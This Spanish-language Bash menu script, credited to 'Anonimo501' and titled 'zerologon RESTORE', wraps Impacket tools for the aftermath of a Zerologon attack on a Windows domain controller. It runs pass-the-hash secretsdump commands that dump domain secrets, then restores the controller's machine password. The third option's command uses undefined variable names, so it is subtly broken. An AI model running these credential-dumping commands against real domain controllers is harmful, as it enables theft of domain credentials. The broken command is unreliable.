#!/bin/bash

opcion="ninguna"

function opcion1
{

echo ""
echo "* Ingrese la IP del Servidor de Dominio - Ejemplo: 192.168.1.100    *"
echo ""
read ip

echo ""
echo "* Ingrese el nombre del DC/AD - Ejemplo: DC-COMPANY    *"
echo ""
read nomdc

echo ""
echo "* Ingrese el nombre de Dominio - Ejemplo: Anonimo501.local    *"
echo ""
read dominio

echo ""
echo "* Ingrese el Hash del Administrador - Ejemplo: e2a9c79e48c89c6db3b256a063f86bbb    *"
echo ""
read hashadmin

echo ""
echo "* Ingrese el nombre del Administrador - Ejemplo: Administrator    *"
echo ""
read adminname

secretsdump.py $dominio/$adminname@$ip -target-ip $ip -hashes :$hashadmin

   read
   return 0

}

function opcion2
{

echo ""
echo "* Ingrese la IP del Servidor de Dominio - Ejemplo: 192.168.1.100    *"
echo ""
read ip

echo ""
echo "* Ingrese el nombre del DC/AD - Ejemplo: DC-COMPANY    *"
echo ""
read nomdc

echo ""
echo "* Ingrese el nombre de Dominio - Ejemplo: Anonimo501.local    *"
echo ""
read dominio

echo ""
echo "* Ingrese el nombre del plain_password_hex optenio en la opcion1 - Ejemplo: Codigo muy largo XD - (plain_password_hex)    *"
echo ""
read hexpass

python3 restorepassword.py $dominio/$nomdc@$nomdc -target-ip $ip -hexpass $hexpass

   read
   return 0

}

function opcion3
{

echo ""
echo "* Ingrese la IP del Servidor de Dominio - Ejemplo: 192.168.1.100    *"
echo ""
read ip

echo ""
echo "* Ingrese el nombre del DC/AD - Ejemplo: DC-COMPANY    *"
echo ""
read nomdc

echo ""
echo "* Ingrese el nombre de Dominio - Ejemplo: Anonimo501.local    *"
echo ""
read dominio

secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 $dominio/$nombredc\$@$ipdc

   read
   return 0

}

while [ $opcion != "4"  ]
    do

	#Banner
	echo ""
	echo "		▒███████▒▓█████  ██▀███   ▒█████   ██▓     ▒█████    ▄████  ▒█████   ███▄    █ 	"
	echo "		▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ 	"
	echo "		░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒	"
	echo "		  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░▒██░    ▒██   ██░░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒	"
	echo "		▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░░██████▒░ ████▓▒░░▒▓███▀▒░ ████▓▒░▒██░   ▓██░	"
	echo "		░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 	"
	echo "		░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░	"
	echo "		░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ 	"
	echo "		  ░ ░       ░  ░   ░         ░ ░      ░  ░    ░ ░        ░     ░ ░           ░ 	"
	echo "		░                                                                              	"
	echo ""

	echo "                                                                                                     "
	echo "                                  [Created By Anonimo501]                                            "
	echo "                            [https://youtube.com/c/Anonimo501]                                       "
	echo "                                                                                                     "
	echo "                           Hola bienvenid@s a zerologon RESTORE                                          "
	echo "                                        	                                                           "

	echo -e "\e[31m \nMenu \e[0m"
	echo -e "\e[33m \t1) \e[0m 1 Obtener plain_password_hex"
	echo -e "\e[33m \t2) \e[0m 2 Restaurando la contraseña (el daño) XD"
        echo -e "\e[33m \t3) \e[0m Verificar la correccion - \e[31m Si sale error ([-] RemoteOperations failed:) todo a salido bien \e[0m :)"
	echo -e "\e[33m \t4) \e[0m Salir\n"
	echo -e "\e[33m \tOpcion: \e[0m \c "

	read opcion

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
